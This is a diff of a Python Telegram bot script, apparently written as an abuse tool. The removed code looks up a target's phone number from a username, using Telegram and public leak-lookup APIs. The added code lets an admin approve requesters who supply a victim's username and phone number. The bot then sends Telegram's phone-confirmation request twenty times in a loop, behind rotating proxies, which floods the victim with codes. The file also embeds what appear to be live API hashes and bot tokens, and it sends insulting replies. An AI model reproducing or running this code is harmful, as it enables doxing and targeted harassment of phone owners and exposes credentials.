@@ -1,73 +1,100 @@
-import re
 import asyncio
+from telethon import TelegramClient, events
+from telethon.tl.functions.account import SendConfirmPhoneCodeRequest
+from telethon.tl.types import CodeSettings
+from telethon.tl.types import KeyboardButtonCallback
 import aiohttp
-import os
-from telethon import TelegramClient
-from telethon.tl.functions.users import GetFullUserRequest
-from telethon.tl.types import User
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import random
 
-API_ID = 2040
-API_HASH = 'b18441a1ff607e10a989891a5462e627'
-BOT_TOKEN = '8958853008:AAEee7acztBpPWX4QN0sV4IZVwEvFxH8mBs'
+api_id = 35911533
+api_hash = '11dafcdc1514796c867055023716d39a'
+bot_token = '8346402249:AAGrv_AIuNJNJ06-Y2-vTASyB_NRgyzhJZI'
+admin_id = 8471847665
 
-user_client = TelegramClient('session', API_ID, API_HASH)
-bot_app = Application.builder().token(BOT_TOKEN).build()
+proxy_list = []
+with open('proxyscrape_premium_http_proxies (2).txt', 'r') as f:
+    for line in f:
+        line = line.strip()
+        if line:
+            parts = line.split('@')
+            if len(parts) == 2:
+                auth = parts[0].split(':')
+                addr = parts[1].split(':')
+                if len(auth) == 2 and len(addr) == 2:
+                    proxy_list.append({
+                        'login': auth[0],
+                        'password': auth[1],
+                        'ip': addr[0],
+                        'port': int(addr[1])
+                    })
 
-async def get_phone(username):
-    try:
-        entity = await user_client.get_entity(username)
-        if not isinstance(entity, User):
-            return None
-        full = await user_client(GetFullUserRequest(entity))
-        phone = getattr(full.full_user, 'phone', None) if hasattr(full, 'full_user') else None
-        if phone:
-            return phone
-        async with aiohttp.ClientSession() as session:
-            for url in [
-                f'https://api.leakcheck.net/public?query={username}',
-                f'https://leak-lookup.com/api/search?key=public&query={username}'
-            ]:
-                try:
-                    async with session.get(url, timeout=3) as resp:
-                        if resp.status == 200:
-                            data = await resp.text()
-                            match = re.search(r'\+\d{11,15}', data)
-                            if match:
-                                return match.group()
-                except:
-                    pass
-        return None
-    except:
-        return None
+client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text('Send @username or ID')
+pending_requests = {}
 
-async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.message.text.strip()
-    await update.message.reply_text(f'Searching: {query}')
-    phone = await get_phone(query)
-    if phone:
-        await update.message.reply_text(f'📱 {phone}')
-    else:
-        await update.message.reply_text('❌ Not found')
+@client.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    await event.respond('tvoia zaiavka otpravlena')
+    username = event.sender.username if event.sender.username else str(event.sender_id)
+    await client.send_message(admin_id, f'ziavka ot @{username}', 
+                              buttons=[[KeyboardButtonCallback('priniat', f'accept_{event.sender_id}'), 
+                                        KeyboardButtonCallback('otklonit', f'reject_{event.sender_id}')]])
+
+@client.on(events.CallbackQuery)
+async def callback(event):
+    data = event.data.decode()
+    if data.startswith('accept_'):
+        user_id = int(data.split('_')[1])
+        pending_requests[user_id] = {'step': 'username'}
+        await client.send_message(user_id, 'pishi username s @')
+        await event.answer('priniato')
+    elif data.startswith('reject_'):
+        user_id = int(data.split('_')[1])
+        await client.send_message(user_id, 'otkloneno idi nahui')
+        await event.answer('otkloneno')
+
+@client.on(events.NewMessage)
+async def handle_input(event):
+    sender = event.sender_id
+    if sender == admin_id:
+        return
+    if sender not in pending_requests:
+        return
+    if pending_requests[sender]['step'] == 'username':
+        username = event.text.strip()
+        if not username.startswith('@'):
+            await event.respond('pishi s @ debil')
+            return
+        pending_requests[sender]['username'] = username
+        pending_requests[sender]['step'] = 'phone'
+        await event.respond('phone:')
+    elif pending_requests[sender]['step'] == 'phone':
+        phone = event.text.strip()
+        username = pending_requests[sender]['username']
+        proxy = random.choice(proxy_list) if proxy_list else None
+        try:
+            for _ in range(20):
+                async with aiohttp.ClientSession() as session:
+                    async with session.get('http://httpbin.org/ip', 
+                                           proxy=f"http://{proxy['login']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}") as resp:
+                        pass
+                await client(SendConfirmPhoneCodeRequest(
+                    phone_number=phone,
+                    settings=CodeSettings(
+                        allow_flashcall=False,
+                        current_number=True,
+                        allow_app_hash=False
+                    )
+                ))
+                await asyncio.sleep(0.5)
+            await event.respond('gatova tvoia mama sdohla')
+        except Exception as e:
+            await event.respond(f'oibka {str(e)}')
+        del pending_requests[sender]
 
 async def main():
-    await bot_app.bot.delete_webhook(drop_pending_updates=True)
-    try:
-        await user_client.start()
-    except:
-        if os.path.exists('session.session'):
-            os.remove('session.session')
-        await user_client.start()
-    bot_app.add_handler(CommandHandler('start', start))
-    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
-    await bot_app.initialize()
-    await bot_app.start()
-    await bot_app.updater.start_polling()
-    await asyncio.Event().wait()
+    await client.start()
+    await client.run_until_disconnected()
 
 if __name__ == '__main__':
     asyncio.run(main())
